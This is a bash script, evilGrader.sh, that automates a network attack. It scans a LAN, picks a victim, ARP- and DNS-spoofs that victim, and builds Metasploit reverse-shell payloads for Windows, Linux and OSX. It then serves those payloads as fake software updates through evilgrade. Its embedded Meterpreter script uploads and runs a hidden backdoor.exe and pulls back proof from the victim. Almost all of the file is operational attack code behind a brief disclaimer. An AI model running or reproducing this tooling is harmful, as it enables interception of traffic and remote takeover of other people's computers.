#!/bin/bash
#----------------------------------------------------------------------------------------------#
#evilGrader.sh v0.5 ~ 2011-04-05                                                               #
# (C)opyright 2011 - g0tmi1k                                                                   #
#---Important----------------------------------------------------------------------------------#
#                     *** Do NOT use this for illegal or malicious use ***                     #
#                By running this, YOU are using this program at YOUR OWN RISK.                 #
#            This software is provided "as is", WITHOUT ANY guarantees OR warranty.            #
#---Default Settings---------------------------------------------------------------------------#
# [Interface] Which interface to use.
interface="wlan0"

#[/path/to/file] Where is the backdoor
backdoorPath="/pentest/windows-binaries/tools/sbd.exe"

#---Default Variables--------------------------------------------------------------------------#
 displayMore="false"            # [true/false] Gives more details on what's happening
 diagnostics="false"            # [true/false] Creates a output file displays exactly what's going on
       quiet="false"            # [true/false] If true, it doesn't use xterm - just uses the one output window
     verbose="0"                # [0/1/2] Shows more info. 0=normal, 1=more, 2=more+commands
       debug="false"            # [true/false] Doesn't delete files, shows more on screen etc.
     logFile="evilGrader.log"   # [/path/to/file] Filename of output
         svn="33"               # SVN (Used for self-updating)
     version="0.5"              # Program version
      target=""                 # null the value
trap 'interrupt break' 2        # Captures interrupt signal (Ctrl + C)

#----Functions---------------------------------------------------------------------------------#
function action() { #action "title" "command" #screen&file #x|y|lines #hold
   if [ "$debug" == "true" ]; then echo -e "action~$@"; fi
   error="free"
   if [ -z "$1" ] || [ -z "$2" ]; then error="1"; fi
   if [ "$3" ] && [ "$3" != "true" ] && [ "$3" != "false" ]; then error="3"; fi
   if [ "$5" ] && [ "$5" != "true" ] && [ "$5" != "false" ]; then error="5"; fi

   if [ "$error" != "free" ]; then
      display error "action Error code: $error" 1>&2
      echo -e "---------------------------------------------------------------------------------------------\nERROR: action (Error code: $error): $1, $2, $3, $4, $5" >> $logFile
      return 1
   fi
   #----------------------------------------------------------------------------------------------#
   command="$2"
   if [ "$quiet" == "true" ] || [ ! -e "/usr/bin/xterm" ]; then
      if [ "$verbose" == "2" ]; then echo "eval $command"   #Command:
      else command="$command &> /dev/null"; fi              # Hides output
      if [ "$diagnostics" == "true" ]; then echo "$1~$command" >> $logFile; fi
      eval "$command"
   elif [ "$quiet" == "false" ]; then
      xterm="xterm" #Defaults
      x="100"; y="0"
      lines="15"
      if [ "$5" == "true" ]; then xterm="$xterm -hold"; fi
      if [ "$verbose" == "2" ]; then echo "$command"; fi   #Command:
      if [ "$diagnostics" == "true" ]; then echo "$1~$command" >> $logFile; fi
      if [ "$diagnostics" == "true" ] && [ "$3" == "true" ]; then command="$command | tee -a $logFile"; fi
      if [ "$4" ]; then
         x=$(echo $4 | cut -d '|' -f1)
         y=$(echo $4 | cut -d '|' -f2)
         lines=$(echo $4 | cut -d '|' -f3)
      fi
      if [ "$debug" == "true" ]; then echo -e "$xterm -geometry 100x$lines+$x+$y -T \"evilGrader v$version - $1\" -e \"$command\""; fi
      $xterm -geometry 100x$lines+$x+$y -T "evilGrader v$version - $1" -e "$command"
   fi
   return 0
}
function cleanUp() { #cleanUp #mode
   if [ "$debug" == "true" ]; then echo -e "cleanUp~$@"; fi
   stage="cleanUp"
   #----------------------------------------------------------------------------------------------#
   if [ "$1" == "nonuser" ]; then exit 3;
   elif [ "$1" != "clean" ]; then
      if [ "$1" == "menu" ]; then echo; fi   # Blank line
      action "Killing programs" "killall -9 python 2> /dev/null 1> /dev/null; /etc/init.d/apache2 stop"
      if [ "$(pgrep xterm)" ]; then killall -9 xterm 2> /dev/null 1> /dev/null; fi   # Cleans up any running xterms.
   fi

   if ( [ "$diagnostics" == "false" ] && [ "$debug" == "false" ] ) || [ "$1" == "remove" ]; then
      if [ "$displayMore" == "true" ]; then display action "Removing: Temp files"; fi
      command="$(pwd)/tmp"
      action "Removing temp files" "rm -rfv $command"
   fi

   if [ "$1" != "remove" ]; then
      if [ "$diagnostics" == "true" ]; then echo -e "End @ $(date)" >> $logFile; fi
      echo -e "\e[01;36m[*]\e[00m Done! =)"
      exit 0
   fi
}
function display() { #display type "message"
   if [ "$debug" == "true" ]; then echo -e "display~$@"; fi
   error="free"; output=""
   if [ -z "$1" ] || [ -z "$2" ]; then error="1"; fi
   if [ "$1" != "action" ] && [ "$1" != "info" ] && [ "$1" != "diag" ] && [ "$1" != "error" ]; then error="5"; fi

   if [ "$error" != "free" ]; then
      display error "display Error code: $error" 1>&2
      echo -e "---------------------------------------------------------------------------------------------\nERROR: display (Error code: $error): $1, $2" >> $logFile
      return 1
   fi
   #----------------------------------------------------------------------------------------------#
   if [ "$1" == "action" ];  then output="\e[01;32m[>]\e[00m"
   elif [ "$1" == "info" ];  then output="\e[01;33m[i]\e[00m"
   elif [ "$1" == "diag" ];  then output="\e[01;34m[+]\e[00m"
   elif [ "$1" == "error" ]; then output="\e[01;31m[!]\e[00m"; fi
   #elif [ "$1" == "input" ];  then output="\e[00;33m[~]\e[00m"
   #elif [ "$1" == "msg" ];    then output="\e[01;30m[i]\e[00m"
   #elif [ "$1" == "option" ]; then output="\e[00;35m[-]\e[00m"
   output="$output $2"
   echo -e "$output"

   if [ "$diagnostics" == "true" ]; then
      if [ "$1" == "action" ]; then output="[>]"
      elif [ "$1" == "info" ]; then output="[i]"
      elif [ "$1" == "diag" ]; then output="[+]"
      elif [ "$1" == "error" ]; then output="[!]"; fi
      echo -e "---------------------------------------------------------------------------------------------\n$output $2" >> $logFile
   fi
   return 0
}
function help() { #help
   if [ "$debug" == "true" ]; then echo -e "help~$@"; fi
   #----------------------------------------------------------------------------------------------#
   echo "(C)opyright 2011 g0tmi1k ~ http://g0tmi1k.blogspot.com

 Usage: bash evilGrader.sh -i [interface] -t [ip] -b [/path/to/file]


 Options:
   -i [interface]                    ---  Internet Interface e.g. $interface

   -t [ip]                           ---  Target's IP address e.g. 192.168.0.105
   -b [/path/to/file]                ---  Backdoor Path e.g. /path/to/backdoor.exe

   -q                                ---  Quite Mode - doesn't use xterm therefore only one output window
   -d                                ---  Diagnostics      (Creates output file, $logFile)
   -v                                ---  Verbose          (Displays more)
   -V                                ---  (Higher) Verbose (Displays more + shows commands)

   -u                                ---  Checks for an update
   -?                                ---  This screen


 Example:
   bash evilGrader.sh
   bash evilGrader.sh -i wlan0 -t 192.168.0.105 -b /path/to/backdoor.exe


 Known issues:
    -Can't automate evilGrade!
    -Help screen - Firefox can't open if it's already open (Root to non-root version of firefox)
"
   s="\e[01;35m"; n="\e[00m"
   echo -e "[-] Read ["$s"R"$n"]eadMe, Vist ["$s"H"$n"]omepage or e["$s"x"$n"]it"
   echo -ne "\e[00;33m[~]\e[00m "; read -p "Select option: "
   if [ "$REPLY" == "r" ]; then eval cat /pentest/exploits/evilgrade/docs/README | less
   elif [ "$REPLY" == "h" ]; then eval "xdg-open http://www.infobytesec.com"; fi # Root to nonroot? ***
   exit 1
}
function interrupt() { #interrupt
   cleanUp interrupt
}
function update() { #update #doUpdate
   if [ "$debug" == "true" ]; then echo -e "update~$@"; fi
   #----------------------------------------------------------------------------------------------#
   display action "Checking for an update"
   command=$(wget -qO- "http://g0tmi1k.googlecode.com/svn/trunk/" | grep "<title>g0tmi1k - Revision" | awk -F " " '{split ($4,A,":"); print A[1]}')
   if [ "$command" ] && [ "$command" -gt "$svn" ]; then
      if [ "$1" ]; then
         display info "Updating"
         wget -q -N "http://g0tmi1k.googlecode.com/svn/trunk/evilGrader/evilGrader.sh"
         display info "Updated! =)"
      else display info "Update available! *Might* be worth updating (bash evilGrader.sh -u)"; fi
   elif [ "$command" ]; then display info "You're using the latest version. =)"
   else display info "No internet connection"; fi
   if [ "$1" ]; then
      echo
      exit 2
   fi
}


#---Main---------------------------------------------------------------------------------------#
echo -e "\e[01;36m[*]\e[00m evilGrader v$version"

#----------------------------------------------------------------------------------------------#
if [ "$(id -u)" != "0" ]; then display error "Run as root" 1>&2; cleanUp nonuser; fi
stage="setup"

#----------------------------------------------------------------------------------------------#
while getopts "i:t:m:e:b:p:a:w:z:s:xko:qdvVu?" OPTIONS; do
   case ${OPTIONS} in
      i ) interface=$OPTARG;;
      t ) target=$OPTARG;;
      b ) backdoorPath=$OPTARG;;
      d ) diagnostics="true";;
      q ) quiet="true";;
      v ) verbose="1";;
      V ) verbose="2";;
      u ) update "do";;
      ? ) help; exit;;
      * ) display error "Unknown option" 1>&2;; # Default
   esac
done

#----------------------------------------------------------------------------------------------#
if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ]; then
   displayMore="true"
   if [ "$debug" == "true" ]; then display info "Debug mode: Enabled"; fi
   if [ "$diagnostics" == "true" ]; then
      display diag "Diagnostics mode"
      echo -e "evilGrader v$version\nStart @ $(date)" > $logFile
      echo "evilGrader.sh" $* >> $logFile
   fi
fi
if [ "$quiet" == "true" ]; then display info "Quite mode: Enabled"; fi

#----------------------------------------------------------------------------------------------#
display action "Analyzing: Environment"

#----------------------------------------------------------------------------------------------#
if [ -z "$interface" ]; then display error "interface can't be blank" 1>&2; cleanUp; fi
if [ -z "$backdoorPath" ]; then display error "backdoorPath can't be blank" 1>&2; cleanUp
elif [ ! -e "$backdoorPath" ]; then display error "There isn't a backdoor at $backdoorPath" 1>&2; cleanUp; fi

if [ "$quiet" != "true" ] && [ "$quiet" != "false" ]; then display error "quiet ($quiet) isn't correct" 1>&2; quiet="false"; fi
if [ "$verbose" != "0" ] && [ "$verbose" != "1" ] && [ "$verbose" != "2" ]; then display error "verbose ($verbose) isn't correct" 1>&2; verbose="0"; fi
if [ "$debug" != "true" ] && [ "$debug" != "false" ]; then display error "debug ($debug) isn't correct" 1>&2; debug="true"; fi
if [ "$diagnostics" != "true" ] && [ "$diagnostics" != "false" ]; then display error "diagnostics ($diagnostics) isn't correct" 1>&2; diagnostics="false"; fi
if [ "$diagnostics" == "true" ] && [ -z "$logFile" ]; then display error "logFile ($logFile) isn't correct" 1>&2; logFile="evilGrader.log"; fi

os=$(cat /etc/*release | tail -1 | awk -F " " '{print $1}')
if [ "$os" == "Fedora" ]; then installPackage="yum -y install" #$(ps < /var/run/yum.pid) | kill $(pgrep yum | while read line; do echo -n \"$line \"; done);
else installPackage="apt-get -y install"; fi

gateway=$(route -n | grep $interface | awk '/^0.0.0.0/ {getline; print $2}')
ourIP=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
broadcast=$(ifconfig $interface | awk '/Bcast/ {split ($3,A,":"); print A[2]}')
networkmask=$(ifconfig $interface | awk '/Mask/ {split ($4,A,":"); print A[2]}')

#----------------------------------------------------------------------------------------------#
int=$(ifconfig -a | grep $interface | awk '{print $1}')
if [ "$int" ] && [ "$int" != "$interface" ]; then display error "The interface $interface, isnt correct." 1>&2; cleanUp; fi

if [ -z "$ourIP" ]; then
   action "Starting network" "/etc/init.d/wicd start && dhclient $interface"
   ourIP=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
   if [ -z "$ourIP" ]; then display error "IP Problem. Haven't got a IP address on $interface. Try running the script again, once you have!" 1>&2; cleanUp; fi
fi


#----------------------------------------------------------------------------------------------#
if [ "$diagnostics" == "true" ]; then
   echo "-Settings------------------------------------------------------------------------------------
        interface=$interface
           target=$target
     backdoorPath=$backdoorPath
      diagnostics=$diagnostics
            quiet=$quiet
          verbose=$verbose
            debug=$debug
               os=$os
   installPackage=$installPackage
          gateway=$gateway
            ourIP=$ourIP
        broadcast=$broadcast
      networkmask=$networkmask
-Environment---------------------------------------------------------------------------------" >> $logFile
   display diag "Detecting: Kernel"
   uname -a >> $logFile
   display diag "Detecting: Hardware"
   echo "-lspci-----------------------------------" >> $logFile
   lspci -knn >> $logFile
   echo "-lsusb-----------------------------------" >> $logFile
   lsusb >> $logFile
   echo "-lsmod-----------------------------------" >> $logFile
   lsmod >> $logFile
   update   # Checks for an update
fi
if [ "$debug" == "true" ] || [ "$verbose" != "0" ]; then
#    display info " diagnostics=$diagnostics"
#    display info "       quiet=$quiet"
#    display info "     verbose=$verbose"
#    display info "       debug=$debug"
    display info "          os=$os"
#    display info "installPackage=$installPackage"
    display info "   interface=$interface"
    if [ "$target" ]; then display info "      target=$target"; fi
    display info "backdoorPath=$backdoorPath"
fi

#----------------------------------------------------------------------------------------------#
if [ ! -e "/usr/bin/xterm" ]; then
   display error "xterm isn't installed" 1>&2
   echo -ne "\e[00;33m[~]\e[00m "; read -p "Would you like to try and install it? [Y/n]: "
   if [[ "$REPLY" != *[Nn]* ]]; then action "Installing xterm" "$installPackage xterm"; fi
   if [ ! -e "/usr/bin/xterm" ]; then display error "Failed to install xterm" 1>&2; display info "Enabling: Quiet Mode"; quiet="true";
   else display info "Installed: xterm"; fi
fi

if [ ! -e "/usr/bin/nmap" ] && [ ! -e "/usr/local/bin/nmap" ]; then
   display error "nmap isn't installed" 1>&2
   echo -ne "\e[00;33m[~]\e[00m "; read -p "Would you like to try and install it? [Y/n]: "
   if [[ "$REPLY" != *[Nn]* ]]; then action "Installing nmap" "$installPackage nmap"; fi
   if [[ "$REPLY" != *[Nn]* ]] && [ ! -e "/usr/bin/nmap" ] && [ ! -e "/usr/local/bin/nmap" ]; then action "Install nmap" "wget -P \"$(pwd)/tmp/\" http://nmap.org/dist/nmap-5.51.tar.bz2 && cd \"$(pwd)/tmp/\" && bzip2 -cd nmap-5.51.tar.bz2 | tar xvf - && cd nmap-5.51 && ./configure && make && make install"; fi
   if [[ "$REPLY" != *[Nn]* ]] && [ ! -e "/usr/bin/nmap" ] && [ ! -e "/usr/local/bin/nmap" ]; then display error "Failed to install nmap" 1>&2; cleanUp
   else display info "Installed: nmap"; fi
fi

if [ ! -e "/usr/sbin/arpspoof" ]; then
   display error "arpspoof isn't installed" 1>&2
   echo -ne "\e[00;33m[~]\e[00m "; read -p "Would you like to try and install it? [Y/n]: "
   if [[ "$REPLY" != *[Nn]* ]]; then action "Installing arpspoof" "$installPackage arpspoof"; fi
   if [[ "$REPLY" != *[Nn]* ]] && [ ! -e "/usr/sbin/arpspoof" ]; then display error "Failed to install arpspoof" 1>&2; cleanUp
   else display info "Installed: arpspoof"; fi
fi

if [ ! -e "/usr/bin/jacksum" ]; then
   display error "jacksum isn't installed" 1>&2
   echo -ne "\e[00;33m[~]\e[00m "; read -p "Would you like to try and install it? [Y/n]: "
   if [[ "$REPLY" != *[Nn]* ]]; then action "Installing jacksum" "$installPackage jacksum"; fi
   if [[ "$REPLY" != *[Nn]* ]] && [ ! -e "/usr/bin/jacksum" ]; then action "Installing jacksum" "wget -P \"$(pwd)/tmp/\" http://sourceforge.net/projects/jacksum/files/jacksum/jacksum-1.7.0.zip/download && cd \"$(pwd)/tmp/\" && unzip jacksum-1.7.0.zip jacksum.jar && mkdir -p /usr/share/java && mv jacksum.jar /usr/share/java && echo 'java -jar \"/usr/share/java/jacksum.jar\" \"\$@\"' > /usr/bin/jacksum  && chmod ugo+rx /usr/bin/jacksum"; fi
   if [ ! -e "/usr/bin/jacksum" ]; then display error "Failed to install jacksum" 1>&2; cleanUp
   else display info "Installed: jacksum"; fi
fi

if [ -e "/pentest/exploits/evilgrade/evilgrade" ] && [ ! -e "/pentest/exploits/evilgrade/certs" ]; then
   display error "EvilGrade apears to be out-of-date" 1>&2
   echo -ne "\e[00;33m[~]\e[00m "; read -p "Would you like to remove it? [Y/n]: "
   if [[ "$REPLY" != *[Nn]* ]]; then
      action "Install requirements" "rm -rf \"/pentest/exploits/evilgrade\""
   fi
   if [ -e "/pentest/exploits/evilgrade/evilgrade"  ]; then display error "Failed to remove EvilGrade" 1>&2; cleanUp
   else display info "Removed: EvilGrade"; fi
fi
if [ ! -e "/pentest/exploits/evilgrade/evilgrade" ]; then
   display error "EvilGrade isn't installed" 1>&2
   echo -ne "\e[00;33m[~]\e[00m "; read -p "Would you like to try and install it? [Y/n]: "
   if [[ "$REPLY" != *[Nn]* ]]; then
      action "Install requirements" "wget -P \"$(pwd)/tmp/\" http://cpan.yimg.com/modules/by-authors/id/GAAS/Data-Dump-1.08.tar.gz && tar -C \"$(pwd)/tmp/\" -xvf \"$(pwd)/tmp/Data-Dump-1.08.tar.gz\" && cd \"$(pwd)/tmp/Data-Dump-1.08\" && perl Makefile.PL && make && make install"
      action "Install EvilGrade" "wget -P \"$(pwd)/tmp/\" http://www.infobyte.com.ar/down/isr-evilgrade-2.0.0.tar.gz && mkdir -p /pentest/exploits/ && tar -C /pentest/exploits/ -xvf \"$(pwd)/tmp/isr-evilgrade-2.0.0.tar.gz\" && mv -f \"/pentest/exploits/isr-evilgrade/\" \"/pentest/exploits/evilgrade/\""
   fi
   if [ ! -e "/pentest/exploits/evilgrade/evilgrade" ]; then display error "Failed to install EvilGrade" 1>&2; cleanUp
   else display info "Installed: EvilGrade"; fi
fi


#----------------------------------------------------------------------------------------------#
display action "Configuring: Environment"

#----------------------------------------------------------------------------------------------#
cleanUp remove
mkdir -p "$(pwd)/tmp/"

#----------------------------------------------------------------------------------------------#
if [ "$displayMore" == "true" ]; then display action "Stopping: Programs"; fi
action "Killing programs" "killall -9 python > /dev/null 2> /dev/null 1> /dev/null; /etc/init.d/apache2 stop"
if [ "$(pgrep xterm)" ]; then killall -9 xterm > /dev/null 2> /dev/null 1> /dev/null; fi   # Cleans up any running xterms.

#----------------------------------------------------------------------------------------------#
if [ "$displayMore" == "true" ]; then display action "Configuring: Network"; fi
ifconfig lo up
echo "1" > /proc/sys/net/ipv4/ip_forward
command=$(cat /proc/sys/net/ipv4/ip_forward)
if [ $command != "1" ]; then display error "Can't enable ip_forward" 1>&2; cleanUp; fi
#echo "1" > /proc/sys/net/ipv4/conf/$interface/forwarding

#----------------------------------------------------------------------------------------------#
display action "Creating: Scripts"
path="$(pwd)/tmp/evilGrader.rc" # metasploit script (AutoRun)
if [ -e "$path" ]; then rm "$path"; fi
echo -e "#! /usr/bin/env ruby
# evilGrader.rc v$version

print_line(\"[>] evilGrader v$version...\")

session = client

host,port = session.tunnel_peer.split(':')
print_status(\"New session found on #{host}:#{port}...\")

print_status(\"Uploading backdoor.exe ($backdoorPath)...\")
session.fs.file.upload_file(\"%SystemDrive%\\\backdoor.exe\", \"$backdoorPath\")
print_status(\"Uploaded!\")
sleep(1)

print_status(\"Executing backdoor.exe...\")
session.sys.process.execute(\"C:\\\backdoor.exe\", nil, {'Hidden' => true})   #Had a problem with %SystemDrive%
print_status(\"Executed!\")
sleep(1)

print_status(\"Downloading proof...\")
session.sys.process.execute(\"cmd.exe /C ipconfig | find \\\"IP\\\" > \\\"%SystemDrive%\\\ip.log\", nil, {'Hidden' => true})
sleep(1)
session.fs.file.download_file(\"/tmp/fakeAP_pwn.lock\", \"%SystemDrive%\\\ip.log\")
sleep(1)
session.sys.process.execute(\"cmd.exe /C del /f \\\"%SystemDrive%\\\ip.log\", nil, {'Hidden' => true})
print_status(\"Downloaded! \")
sleep(1)

print_status(\"Done! (= Have you... g0tmi1k?\")
sleep(1)" >> $path
if [ "$verbose" == "2" ]; then echo "Created: $path"; fi
if [ "$debug" == "true" ]; then cat "$path"; fi
if [ ! -e "$path" ]; then display error "Couldn't create $path" 1>&2; cleanUp; fi

#----------------------------------------------------------------------------------------------#
path="$(pwd)/tmp/evilGrader.rc" # Metasploit script (Listener)
if [ -e "$path" ]; then rm "$path"; fi
echo -e "# evilGrader.rc v$version
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST $ourIP
set LPORT 4564
set ExitOnSession false
exploit -j

use exploit/multi/handler
set PAYLOAD osx/x86/shell_reverse_tcp
set LHOST $ourIP
set LPORT 4565
set ExitOnSession false
exploit -j

use exploit/multi/handler
set PAYLOAD linux/x86/shell/reverse_tcp
set LHOST $ourIP
set LPORT 4566
set ExitOnSession false
set AutoRunScript migrate -f
exploit -j" >> $path
if [ "$verbose" == "2" ]; then echo "Created: $path"; fi
if [ "$debug" == "true" ]; then cat "$path"; fi
if [ ! -e "$path" ]; then display error "Couldn't create $path" 1>&2; cleanUp; fi


#----------------------------------------------------------------------------------------------#
display action "Creating: Exploits"
action "Exploits" "msfpayload linux/x86/shell/reverse_tcp LHOST=$ourIP LPORT=4566 X > \"$(pwd)/tmp/nix.bin\"; msfpayload osx/x86/shell_reverse_tcp LHOST=$ourIP LPORT=4565 X > \"$(pwd)/tmp/osx.bin\"; msfpayload windows/meterpreter/reverse_tcp LHOST=$ourIP LPORT=4564 X > \"$(pwd)/tmp/win.exe\"; sleep 1"
display info "  Linux (SHA256): $(jacksum -a sha256 $(pwd)/tmp/nix.bin | awk '{print $1}')"
display info "     Linux (MD5): $(jacksum -a md5 $(pwd)/tmp/nix.bin | awk '{print $1}')"
display info "    OSX (SHA256): $(jacksum -a sha256 $(pwd)/tmp/osx.bin | awk '{print $1}')"
display info "       OSX (MD5): $(jacksum -a md5 $(pwd)/tmp/osx.bin | awk '{print $1}')"
display info "Windows (SHA256): $(jacksum -a sha256 $(pwd)/tmp/win.exe | awk '{print $1}')"    #hashWinBOTH="$(jacksum -a sha1+md5 -F \"#CHECKSUM{0} #CHECKSUM{1}\" \"$(pwd)/tmp/win.exe\")"
display info "   Windows (MD5): $(jacksum -a md5 $(pwd)/tmp/win.exe | awk '{print $1}')"


#----------------------------------------------------------------------------------------------#
ip4="${ourIP##*.}"; x="${ourIP%.*}"
ip3="${x##*.}"; x="${x%.*}"
ip2="${x##*.}"; x="${x%.*}"
ip1="${x##*.}"
nm4="${networkmask##*.}"; x="${networkmask%.*}"
nm3="${x##*.}"; x="${x%.*}"
nm2="${x##*.}"; x="${x%.*}"
nm1="${x##*.}"
let sn1="$ip1&$nm1"
let sn2="$ip2&$nm2"
let sn3="$ip3&$nm3"
let sn4="$ip1&$nm4"
let en1="$ip1|(255-$nm1)"
let en2="$ip2|(255-$nm2)"
let en3="$ip3|(255-$nm3)"
let en4="$ip4|(255-$nm4)"
subnet=$sn1.$sn2.$sn3.$sn4
endnet=$en1.$en2.$en3.$en4
oldIFS=$IFS; IFS=.
for dec in $networkmask; do
   case $dec in
      255) let nbits+=8;;
      254) let nbits+=7;;
      252) let nbits+=6;;
      248) let nbits+=5;;
      240) let nbits+=4;;
      224) let nbits+=3;;
      192) let nbits+=2;;
      128) let nbits+=1;;
      0);;
      *) display error "Bad input: dec ($dec)" 1>&2; cleanUp
      esac
done
IFS=$oldIFS
while true; do
   if [ "$displayMore" == "true" ]; then display action "Scanning: Targets"; fi
   action "Scanning Targets" "nmap $subnet/$nbits -e $interface -n -sP -sn | tee \"$(pwd)/tmp/evilGrade.tmp\"" #-O -oX evilGrade.nmap.xml
   #----------------------------------------------------------------------------------------------#
   index="-1"; i="0"   # So we start at "0"
   while read LINE; do
      case "$LINE" in
         *"Nmap scan report for"* )     index=$(($index+1)); targetIP[$index]=$(echo $LINE | sed 's/Nmap scan report for //');;
         *"MAC Address:"* )             targetMAC[$index]=$(echo $LINE | awk '{print $3}'); targetMANU[$index]=$(echo $LINE | awk -F "(" '{print $2}' | sed 's/.$//g');;
      esac
   done < "$(pwd)/tmp/evilGrade.tmp"
   #----------------------------------------------------------------------------------------------#
   if [ "$target" ]; then
      id="unknown"
      for tmp in ${targetIP[@]}; do
         if [ "$tmp" == "$target" ]; then
            id="found"
         fi
      done
   fi
   if [ "$id" != "found" ]; then
      if [ "$target" ]; then display error "Couldn't detect target ($target)"; target=""; fi
      #----------------------------------------------------------------------------------------------#
      s="\e[01;35m"; n="\e[00m"
      echo -e "------------------------------------------------------------------------------------------------------------\n| Num |        IP       |        MAC        |     Hostname    |   OS   | Manufacture                       |\n|-----|-----------------|-------------------|-----------------|--------|-----------------------------------|"
      for targets in "${targetIP[@]}"; do
         command="|  %-2s |" # Number

         if [ "${targetIP[${i}]}" == "$gateway" ]; then  command="$command \e[01;31m%-15s\e[00m |" # IP - Gateway (Not wise to attack this)
         elif [ "${targetIP[${i}]}" == "$ourIP" ]; then  command="$command \e[01;31m%-15s\e[00m |" # IP - OurIP (Not wise to attack this)
         else  command="$command %-15s |"; fi

         command="$command %-17s | %-15s | %-7s| %-34s|\n" # MAC Hostname OS Manufacture
         printf "$command" "$(($i+1))" "${targetIP[${i}]}" "${targetMAC[${i}]}" "-" "-" "${targetMANU[${i}]}"
         i=$(($i+1))
      done
      echo -e "|  $(($i+1))  | $broadcast   |     *Everyone*    |    *Everyone*   |*Every1*|           *Everyone*              |\n------------------------------------------------------------------------------------------------------------"
      tmp="[-] Re["$s"s"$n"]can, ["$s"M"$n"]anual input"; if [ "$i" -gt 0 ]; then tmp="$tmp or num ["$s"1"$n"-"$s"$((i+1))"$n"]"; fi
      echo -e "$tmp"
      #----------------------------------------------------------------------------------------------#
      while true; do
         echo -ne "\e[00;33m[~]\e[00m "; read -p "Select option: "
         if [ "$REPLY" == "x" ]; then cleanUp menu
         elif [ "$REPLY" == "m" ]; then echo -ne "\e[00;33m[~]\e[00m "; read -p "IP address?: "; target="$REPLY"; break 2
         elif [ "$REPLY" == "s" ]; then break;
         elif [ -z $(echo "$REPLY" | tr -dc '[:digit:]'l) ]; then display error "Bad input" 1>&2
         elif [ $(echo $REPLY | tr -dc '[:digit:]') ] && ( [ "$REPLY" -lt "1" ] || [ "$(($REPLY-1))" -gt "$i" ] ); then display error "Incorrect number" 1>&2
         else target=${targetIP[$(($REPLY-1))]}; break 2;
         fi
      done
   else break; fi
done
IP_ADDR_VAL=$(echo "$target" | grep -Ec '^(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9])\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[0-9])')
if [ $IP_ADDR_VAL -eq 0 ]; then
   display error "Bad IP address" 1>&2
   target=$(ifconfig $interface | awk '/Bcast/ {split ($3,A,":"); print A[2]}')
   display info "Setting target IP: $target (Broadcast for $interface)"
fi

display info "target=$target"
if [ "$target" == "$gateway" ]; then display error "Target's IP is the same as the gateway, $gateway. This isn't wise!" 1>&2; fi
if [ "$target" == "$ourIP" ]; then display error "Target's IP is the same as our IP, $ourIP. This isn't wise!" 1>&2; fi


#----------------------------------------------------------------------------------------------#
display action "Starting: Exploit"
action "Metasploit (Windows)" "msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$ourIP AutoRunScript=/tmp/evilGrade.rb E" "true" "0|265|15" &
#action "Metasploit" "msfconsole -L -n -r \"$(pwd)/tmp/evilGrade.rc\"" "true" "0|265|15" &
sleep 5


#----------------------------------------------------------------------------------------------#
display action "Starting: MITM Attack (ARP + DNS)"
action "MITM" "dnsspoof -i $interface & arpspoof -i $interface -t $target $gateway" "true" "0|80|5" &
sleep 1


#----------------------------------------------------------------------------------------------#
display action "Starting: SBD"
action "SBD" "sbd -l -k g0tmi1k -p 7333" "true" "0|580|10" &
sleep 1

#----------------------------------------------------------------------------------------------#
# Cant automate evilGrade itself! )=     #set debug 0 // '[\"/pentest/exploits/framework3/msfpayload windows/meterpreter/reverse_tcp LHOST=$ourIP X > <%OUT%>/tmp/evilGrade.exe<%OUT%>\"]'
display action "Starting: EvilGrade"
display info "Commands:"
display info "1.) Check options
evilgrade>show options
evilgrade>set DNSAnswerIp $gateway"
display info "2.) Select program:
evilgrade>show modules
evilgrade>config notepadplus
evilgrade>set enable 1"
display info "3.) Select Payload:
Linux
evilgrade>set agent \"$(pwd)/tmp/nix.bin\"
OSX
   evilgrade>set agent \"$(pwd)/tmp/osx.bin\"
Windows
   evilgrade>set agent \"$(pwd)/tmp/win.exe\""
display info "4.) Check everything is okay! (\"Help\" if you get stuck)
evilgrade>show options"
display info "5.) Start (....When you're ready)
evilgrade>start
evilgrade>show active"
display info "6.) Exit (...Once it's done!)
evilgrade>exit"
sleep 5   # Give the user time to read it
tmp="$(pwd)"; cd "/pentest/exploits/evilgrade"; ./evilgrade; cd "$tmp"

#----------------------------------------------------------------------------------------------#
if [ "$diagnostics" == "true" ]; then echo "-Done!---------------------------------------------------------------------------------------" >> $logFile; fi
cleanUp clean




#---Ideas/Notes/DumpPad------------------------------------------------------------------------#

#---DumpCode-----------------------------------------------------------------------------------#
